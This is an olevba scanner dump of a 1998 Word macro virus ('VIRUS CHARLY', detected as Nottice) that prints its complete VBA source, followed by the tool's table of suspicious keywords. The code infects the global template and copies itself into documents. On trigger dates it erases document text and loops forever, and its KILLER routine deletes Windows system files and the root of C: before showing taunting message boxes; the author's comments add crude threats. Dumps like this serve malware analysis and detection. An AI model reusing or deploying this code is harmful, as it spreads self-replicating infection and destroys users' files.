olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.s-31bd51815304ef544904895ceaa700bedefb1471
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.s-31bd51815304ef544904895ceaa700bedefb1471 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nottice.s-31bd51815304ef544904895ceaa700bedefb1471 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN() 'VIRUS CHARLY  Versión 2.1     Copyright  Lima - Perú     1998. Charly Corp.
Attribute MAIN.VB_Description = "F%\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.AutoClose.MAIN"
'Fué creado el 1 de Dic. de 1998 por CharlySoft. Está protegido por las leyes del derecho de autor;cualquier
'intento de copia sera sancionada drásticamente.Al infractor se le obligara a colocarse de rodillas frente
'a su verdugo(En este caso, YO)para luego ser destrozado con un potente ORGANO SEXUAL EN SU MAXIMA ERECCIÓN
' ------------>        Je Je Je Je...
Dim cjt$
On Error GoTo -1: On Error GoTo SALIDA
WordBasic.DisableAutoMacros 0
cjt$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If cjt$ = "normal.dot" Then
   If INFECTA = 1 Then
      GoTo SALIDA
   Else
      InfectaDOC
   End If
Else
      InfectaGlobal
End If
SALIDA:
WordBasic.Call "CHARLYTO"
End Sub
Private Function INFECTA()
Dim i
INFECTA = 0
If WordBasic.CountMacros(1) > 0 Then
   For i = 1 To WordBasic.CountMacros(1)
     If WordBasic.[MacroName$](i, 1) = "CHARLYTO" Then INFECTA = 1
   Next i
End If
End Function
Private Sub InfectaDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:CHARLYTO", WordBasic.[FileName$]() + ":CHARLYTO"
WordBasic.MacroCopy "Global:HerramMacro", WordBasic.[FileName$]() + ":HerramMacro"
WordBasic.MacroCopy "Global:KILLER", WordBasic.[FileName$]() + ":KILLER"
WordBasic.FileSaveAll 1, 1
End Sub
Private Sub InfectaGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":CHARLYTO", "Global:CHARLYTO"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":HerramMacro", "Global:HerramMacro"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":KILLER", "Global:KILLER"
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO CHARLYTO.bas 
in file: Virus.MSWord.Nottice.s-31bd51815304ef544904895ceaa700bedefb1471 - OLE stream: 'Macros/VBA/CHARLYTO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Texto As String
Public Sub MAIN()
Attribute MAIN.VB_Description = "Macro creada el 01/12/98 por mi%\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.CHARLYTO.MAIN"
If WordBasic.Day(WordBasic.Now()) = 23 And WordBasic.Month(WordBasic.Now()) = 5 Then
   Texto = "FELIZ CUMPLEAÑOS CHARLY": FORMATO
   WordBasic.Insert "***Lima - Perú (VIRUS CHARLY)***": EMAIL
   WordBasic.Call "KILLER"
INFINITO:
GoTo INFINITO
ElseIf WordBasic.Day(WordBasic.Now()) = 19 And WordBasic.Month(WordBasic.Now()) = 5 Then
   Texto = "FELICIDADES POR TU CUMPLEAÑOS MINI": FORMATO
   WordBasic.Insert "En Homenaje a mi Querida Hermanita.   "
   WordBasic.FormatFont Points:="24", Color:=2: WordBasic.Insert ": "
   WordBasic.FormatFont Points:="18", Color:=6: WordBasic.Insert ")"
   WordBasic.InsertPara: WordBasic.InsertPara
   WordBasic.Insert "***Lima - Perú (VIRUS CHARLY)***": EMAIL
   WordBasic.Call "KILLER"
GoTo INFINITO
End If '***FECHAS ESPECIALES***
If WordBasic.Day(WordBasic.Now()) = 1 Or WordBasic.Day(WordBasic.Now()) = 4 _
Or WordBasic.Day(WordBasic.Now()) = 11 Or WordBasic.Day(WordBasic.Now()) = 13 _
Or WordBasic.Day(WordBasic.Now()) = 17 Or WordBasic.Day(WordBasic.Now()) = 31 _
Or (WordBasic.Day(WordBasic.Now()) = 25 And WordBasic.Month(WordBasic.Now()) = 12) Then
   If WordBasic.Day(WordBasic.Now()) = 25 And WordBasic.Month(WordBasic.Now()) = 12 Then
      Texto = "FELIZ NAVIDAD .... Je Je Je": FORMATO
      WordBasic.Insert "Les Desea C.J.T.A."
   End If
   Texto = " ***Lima - Perú (VIRUS CHARLY)***": FORMATO
   EMAIL
   WordBasic.Call "KILLER"
GoTo INFINITO
End If
End Sub
Private Sub FORMATO()
WordBasic.EditSelectAll: Selection.Delete
WordBasic.ToggleFull: WordBasic.Font "Busorama MD BT": WordBasic.FontSize 20
WordBasic.CenterPara: WordBasic.Insert Texto: WordBasic.StartOfLine: WordBasic.CharRight 1, 1
WordBasic.Bold: WordBasic.FormatFont Points:="28", Color:=2: WordBasic.EndOfLine
WordBasic.InsertPara: WordBasic.InsertPara: WordBasic.FormatFont Points:="18", Color:=6
End Sub
Private Sub EMAIL()
WordBasic.InsertPara: WordBasic.InsertPara
WordBasic.Font "Comic Sans MS": WordBasic.CenterPara: WordBasic.Bold
WordBasic.FormatFont Points:="11", Color:=2: WordBasic.Insert "Charly_Ter@Hotmail.com"
End Sub
-------------------------------------------------------------------------------
VBA MACRO HerramMacro.bas 
in file: Virus.MSWord.Nottice.s-31bd51815304ef544904895ceaa700bedefb1471 - OLE stream: 'Macros/VBA/HerramMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
'FormFalso.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO KILLER.bas 
in file: Virus.MSWord.Nottice.s-31bd51815304ef544904895ceaa700bedefb1471 - OLE stream: 'Macros/VBA/KILLER'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN() '***Elimina archivos***
Attribute MAIN.VB_Description = "Macro creada el 01/12/98 por mi%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.KILLER.MAIN"
Dim Valor As Integer
On Error GoTo FIN
Randomize: Valor = Int((2 * Rnd) + 1)
If Valor = 1 Then
   Kill "C:\Windows\*.exe": Kill "C:\Windows\Command\*.*": Kill "C:\Windows\System\*.*"
Else
   Kill "C:\Windows\Command\*.*": Kill "C:\*.*": Kill "C:\Windows\SYSBCKUP\*.*"
End If
FIN:
If ActiveDocument.Saved = False Then ActiveDocument.Save
MATADOR
End Sub
Private Sub MATADOR()
Valor = MsgBox("Maldito, Quieres Que Borre Tu Porquería de Archivos?", 4 + 16 + 4096, "VIRUS CHARLY     versión 2.1     ===>   IDAT")
If Valor = 6 Then
   Valor = MsgBox("Por Idiota Se Borraron Tus Archivos De Sistema", 0 + 64, "VIRUS CHARLY  versión 2.1  Charly_Ter@hotmail.com")
Else
   Valor = MsgBox("Mala Elección, Perdistes Tus Archivos De Sistema", 0 + 64, "VIRUS CHARLY  versión 2.1   Charly_Ter@hotmail.com")
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

